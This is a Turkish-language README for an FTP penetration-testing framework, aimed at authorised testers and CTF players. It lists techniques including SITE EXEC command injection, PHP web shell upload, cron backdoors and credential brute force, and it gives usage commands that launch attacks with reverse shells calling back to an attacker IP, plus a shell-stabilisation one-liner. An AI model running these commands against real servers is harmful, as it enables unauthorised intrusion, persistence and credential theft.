# 🔐 FTP Advanced Penetration Testing Framework 

 Güvenlik araştırmacıları, penetrasyon testçileri ve etik hackerlar için geliştirilmiştir.

## 📋 Özellikler

### 🔍 Zafiyet Tarama
- ✓ Anonymous FTP erişim kontrolü
- ✓ SITE EXEC komut enjeksiyonu tespiti
- ✓ SITE CHMOD yetkisi kontrolü
- ✓ Yazılabilir dizin keşfi
- ✓ Directory traversal testi
- ✓ FTP bounce attack kontrolü
- ✓ ASCII enjeksiyon testi
- ✓ Buffer overflow kontrolü

### 💣 Exploitation Teknikleri
1. **SITE EXEC Direkt Saldırı**
   - Bash, Python, Perl, Ruby shell'leri
   - Komut enjeksiyonu

2. **SITE EXEC Obfuscation**
   - Base64 encoding
   - Hex encoding
   - WAF bypass teknikleri

3. **Shell Upload & Execute**
   - Otomatik shell yükleme
   - Permission ayarlama
   - Execution

4. **Cron Job Injection**
   - Persistent backdoor
   - Scheduled command execution

5. **Web Shell Upload**
   - PHP web shell
   - Web dizinlerine yükleme
   - Remote command execution

6. **.htaccess Manipulation**
   - File type override
   - PHP execution tricks

7. **PHP Wrapper Exploits**
   - php://filter
   - data:// wrapper
   - expect:// wrapper

### 🔑 Credential Attacks
- Otomatik brute force
- Yaygın credential listesi
- Custom wordlist desteği
- Rate limiting

### 📊 Raporlama
- Detaylı metin raporları
- JSON formatında çıktı
- Executive summary
- Post-exploitation kılavuzu
- Zafiyet önerileri
---
## 🚀 Kurulum

### Sistem Gereksinimleri
```bash
# İşletim Sistemi: Linux (Ubuntu/Kali/Parrot önerilir)
# Python: 3.8+
# Gerekli Araçlar: netcat, nmap, ftp

# Kurulum
sudo apt-get update
sudo apt-get install -y python3 python3-pip netcat nmap ftp sshpass

# İzinleri ayarla
chmod +x ftp_pentest_framework.py
chmod +x quick_start.sh
chmod +x payload_generator.py
```

---

## 📚 Kullanım

### Yöntem 1: Quick Start Script (Önerilen)
```bash
./quick_start.sh
```
İnteraktif menü ile kolay kullanım.

### Yöntem 2: Manuel Kullanım

#### Temel Kullanım
```bash
# Anonymous login ile tarama
python3 ftp_pentest_framework.py -t 192.168.1.100

# Credential ile tarama
python3 ftp_pentest_framework.py -t 192.168.1.100 -u admin -pw password123

# Verbose mode
python3 ftp_pentest_framework.py -t 192.168.1.100 -v
```

#### Gelişmiş Kullanım
```bash
# Brute force ile
python3 ftp_pentest_framework.py -t 192.168.1.100 --brute-force -v

# Özel reverse shell ayarları
python3 ftp_pentest_framework.py -t 192.168.1.100 -r 10.0.0.5 -rp 5555

# Tam özellikli saldırı
python3 ftp_pentest_framework.py \
  -t 192.168.1.100 \
  -u admin \
  -pw admin123 \
  -r 10.0.0.5 \
  -rp 4444 \
  --brute-force \
  -v
```

### Yöntem 3: Payload Generator
```bash
# Tüm payload türlerini üret
python3 payload_generator.py -i 10.0.0.5 -p 4444

# Sadece bash payload
python3 payload_generator.py -i 10.0.0.5 -p 4444 -t bash

# Dosyaya kaydet
python3 payload_generator.py -i 10.0.0.5 -p 4444 -o payloads.txt
```

---

## 📖 Komut Satırı Parametreleri

```
Gerekli Parametreler:
  -t, --target        Hedef FTP sunucu IP/hostname

Opsiyonel Parametreler:
  -p, --port          FTP portu (varsayılan: 21)
  -u, --username      FTP kullanıcı adı (varsayılan: anonymous)
  -pw, --password     FTP şifresi (varsayılan: anonymous)
  -r, --reverse-ip    Reverse shell IP (otomatik tespit)
  -rp, --reverse-port Reverse shell portu (varsayılan: 4444)
  --brute-force       Credential brute force etkinleştir
  --no-listener       Otomatik listener başlatma
  -v, --verbose       Detaylı log
```

## 🎯 Kullanım Senaryoları

### Senaryo 1: CTF Challenge
```bash
# Hedef: Bilinmeyen FTP sunucusu
python3 ftp_pentest_framework.py -t 10.0.2.33 --brute-force -v
```

### Senaryo 2: Penetrasyon Testi (İzinli)
```bash
# Hedef: Müşteri sunucusu (izinli)
python3 ftp_pentest_framework.py \
  -t customer.example.com \
  -u provided_user \
  -pw provided_pass \
  -r attacker_public_ip \
  -v
```

### Senaryo 3: Lab Ortamı
```bash
# Hedef: Yerel lab sunucusu
python3 ftp_pentest_framework.py -t 192.168.56.101 -v
```

---

## 🔧 Sorun Giderme

### Problem: "Connection refused"
**Çözüm:**
```bash
# Port açık mı kontrol et
nmap -p 21 <target_ip>

# FTP servisi çalışıyor mu?
nc -vz <target_ip> 21
```

### Problem: "Authentication failed"
**Çözüm:**
```bash
# Brute force dene
python3 ftp_pentest_framework.py -t <target> --brute-force
```

### Problem: "Shell alındı ama çalışmıyor"
**Çözüm:**
```bash
# Shell'i stabilize et
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z bas
stty raw -echo; fg
reset
```

---

## 📊 Örnek Çıktı

```
╔═══════════════════════════════════════════════════════════════════════════╗
║   ███████╗████████╗██████╗     ██████╗ ███████╗███╗   ██╗████████╗      ║
║   ██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝      ║
║   █████╗     ██║   ██████╔╝    ██████╔╝█████╗  ██╔██╗ ██║   ██║         ║
║              Advanced FTP Penetration Testing Framework v3.0             ║
╚═══════════════════════════════════════════════════════════════════════════╝

[Phase 1] Establishing FTP connection...
✓ Successfully authenticated as 'anonymous'

[Phase 2] Scanning for vulnerabilities...
✗ VULNERABLE: Anonymous access enabled
✗ CRITICAL: SITE EXEC vulnerable
✓ Writable directory found: /var/www/html

[Phase 3] Starting reverse shell listener...
✓ Listener started successfully

[Phase 4] Attempting exploitation...
✓ SUCCESS: SITE EXEC Direct worked!

[Phase 5] Generating report...
✓ Report saved to: ftp_pentest_report_20260213_193045.txt
```
